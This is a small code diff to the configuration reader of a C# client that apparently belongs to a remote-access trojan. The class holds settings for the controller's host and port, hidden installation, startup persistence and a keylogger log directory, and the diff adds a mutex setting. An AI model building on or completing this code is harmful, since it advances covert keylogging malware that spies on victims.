@@ -9,11 +9,12 @@ namespace Client.Controllers.Tools
     //BootController
     public static class Boot
     {
-        private static string[] readerKey = { "host", "port", "recoTries", "identifier", "logDir", "startupName", "installPath", "txtSubDirI", "txtFileNameI", "chk" };
+        private static string[] readerKey = { "host", "port", "recoTries", "identifier", "mutex", "logDir", "startupName", "installPath", "txtSubDirI", "txtFileNameI", "chk" };
         public static string host { get; set; }     // HOST
         public static ushort port { get; set; }     // HOST
         public static int recoTries { get; set; }     // TIME BETWEEN RECONNECTION TRIES
         public static string identifier { get; set; }     // CLIENT NAME IDENTIFIER
+        public static string mutex { get; set; }     // MUTEX
         public static bool installStub { get; set; }     // INSTALL STUB
         public static bool hideSubDirectory { get; set; }     // INSTALL STUB
         public static bool hideFile { get; set; }     // INSTALL STUB
@@ -62,6 +63,11 @@ namespace Client.Controllers.Tools
             else if (readerkey == "identifier")
             {
                 identifier = readerString.Replace("-START" + readerkey + "-", "");
+            }
+            //MUTEX 
+            if (readerkey == "mutex")
+            {
+                 mutex = readerString.Replace("-STARTmutex-", "");
             }
             // KEYLOGGER SETTINGS
             else if (readerkey == "logDir")
